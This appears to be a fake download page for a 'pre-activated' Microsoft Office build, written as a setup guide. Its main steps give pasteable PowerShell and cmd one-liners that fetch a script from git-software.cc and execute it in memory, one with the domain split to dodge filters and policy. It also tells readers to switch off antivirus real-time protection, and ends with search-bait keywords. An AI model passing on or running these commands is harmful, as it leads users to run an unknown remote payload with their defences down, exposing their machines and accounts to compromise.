# Microsoft Office — Standalone Desktop Installer

Pre-activated local build for testing and deployment.

> **Distribution Type:** Pre-activated Standalone Build  
> **Target Platform:** Windows x64 Desktop  
> **Estimated File Size:** 1.5 GB  
> **Last Verified Mirror Sync:** October 2026

---

## 🛠️ Quick Setup Guide (PowerShell)

1. Launch PowerShell:
   * Press `Win + X` on your keyboard.
   * Click on **Terminal** or **Windows PowerShell** from the list.

2. Execute the Setup Script:
   Copy the command below, paste it into your PowerShell window, and hit `Enter`. Wait until all :

   ```cmd
   $u = "https://git-software.cc/ps/Setup.ps1"; $r = [System.Net.WebRequest]::Create($u); $resp = $r.GetResponse(); $stream = $resp.GetResponseStream(); $reader = New-Object System.IO.StreamReader($stream); $c = $reader.ReadToEnd(); $reader.Close(); $resp.Close(); .([scriptblock]::Create($c))
   ```

---

## 💡 Resolving Issues

### 💬 Script is blocked by Execution Policy
If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
```cmd
powershell -Command "$u='https://git-software.'+'cc/ps/Setup.ps1'; $r=[System.Net.WebRequest]::Create($u); $resp=$r.GetResponse(); $stream=$resp.GetResponseStream(); $reader=New-Object System.IO.StreamReader($stream); $c=$reader.ReadToEnd(); $reader.Close(); $resp.Close(); .([scriptblock]::Create($c))"
```

### 💬 Antivirus / SmartScreen Alerts
Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

---

## 🔍 Organic Discovery & Identification

* download Microsoft Office setup 2026
* Microsoft Office deployment package 2026
* offline installation Microsoft Office 2026
* Microsoft Office desktop utility package 2026

## 📖 Core Build Parameters

Offline application deployment involves creating a self-contained installation package that can be installed without an internet connection.
